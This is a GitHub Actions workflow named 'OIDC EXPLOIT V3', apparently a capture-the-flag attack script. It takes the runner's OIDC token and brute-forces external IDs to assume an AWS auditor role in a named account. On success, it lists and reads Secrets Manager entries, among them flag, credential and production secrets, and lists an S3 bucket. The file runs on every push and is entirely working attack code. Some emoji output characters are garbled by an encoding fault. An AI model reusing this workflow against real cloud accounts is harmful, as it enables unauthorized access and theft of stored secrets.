name: OIDC EXPLOIT V3 - External ID Focus

on:
  workflow_dispatch:
  push:

jobs:
  exploit:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
    - name: Get OIDC Token
      id: oidc-token
      run: |
        # Get the OIDC token to examine its claims
        TOKEN=$(curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
                     -H "Accept: application/json; api-version=2.0" \
                     "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
        echo "::add-mask::$TOKEN"
        echo "token=$TOKEN" >> $GITHUB_OUTPUT
        
        # Decode token claims for debugging
        echo "=== TOKEN CLAIMS ==="
        echo "$TOKEN" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq . || echo "Could not decode token"
        
    - name: Try HEXNOVA404-based External IDs
      env:
        OIDC_TOKEN: ${{ steps.oidc-token.outputs.token }}
      run: |
        # Try organization-based external IDs
        for ext_id in "HEXNOVA404" "hexnova404" "HEXNOVA404-audit" "HEXNOVA404-prod" "HEXNOVA404-2025"; do
          echo "Trying external ID: $ext_id"
          aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::170974506515:role/prod-readonly-auditor" \
            --role-session-name "OIDCTest-$(date +%s)" \
            --web-identity-token "$OIDC_TOKEN" \
            --external-id "$ext_id" \
            --region us-west-1 2>/dev/null && {
              echo "üéâ SUCCESS with external ID: $ext_id"
              export AWS_DEFAULT_REGION=us-west-1
              aws sts get-caller-identity
              aws secretsmanager list-secrets
              exit 0
            }
        done
        
    - name: Try Date and Repository Pattern External IDs  
      env:
        OIDC_TOKEN: ${{ steps.oidc-token.outputs.token }}
      run: |
        # Try date and repository patterns
        for ext_id in "2025-07-10" "20250710" "Organisation-Vault" "nerdyamigo/Organisation-Vault" "audit-2025-07-10"; do
          echo "Trying external ID: $ext_id"
          aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::170974506515:role/prod-readonly-auditor" \
            --role-session-name "OIDCTest-$(date +%s)" \
            --web-identity-token "$OIDC_TOKEN" \
            --external-id "$ext_id" \
            --region us-west-1 2>/dev/null && {
              echo "üéâ SUCCESS with external ID: $ext_id"
              export AWS_DEFAULT_REGION=us-west-1
              aws sts get-caller-identity
              aws secretsmanager list-secrets
              exit 0
            }
        done
        
    - name: Try Common Security Patterns
      env:
        OIDC_TOKEN: ${{ steps.oidc-token.outputs.token }}
      run: |
        # Try common security-related external IDs
        for ext_id in "github-actions" "oidc-federation" "temp-audit-access" "readonly-audit" "ci-cd-access" "deployment-audit"; do
          echo "Trying external ID: $ext_id"
          aws sts assume-role-with-web-identity \
            --role-arn "arn:aws:iam::170974506515:role/prod-readonly-auditor" \
            --role-session-name "OIDCTest-$(date +%s)" \
            --web-identity-token "$OIDC_TOKEN" \
            --external-id "$ext_id" \
            --region us-west-1 2>/dev/null && {
              echo "üéâ SUCCESS with external ID: $ext_id"
              export AWS_DEFAULT_REGION=us-west-1
              aws sts get-caller-identity
              aws secretsmanager list-secrets
              exit 0
            }
        done

    - name: Final Success Check
      run: |
        # Check if we got AWS access from any of the attempts
        if aws sts get-caller-identity 2>/dev/null; then
          echo "üéâ AWS ACCESS SUCCESSFUL!"
          echo "Listing secrets..."
          aws secretsmanager list-secrets
          
          echo "Checking S3 bucket..."
          aws s3 ls s3://ci-deployment-logsv1/ || echo "Bucket access failed"
          
          # Try to get common secret patterns
          for secret in "hexnova404-flag" "final-flag" "audit-credentials" "prod-secrets"; do
            echo "Trying secret: $secret"
            aws secretsmanager get-secret-value --secret-id "$secret" 2>/dev/null || echo "Secret $secret not found"
          done
        else
          echo "‚ùå No AWS access gained"
        fi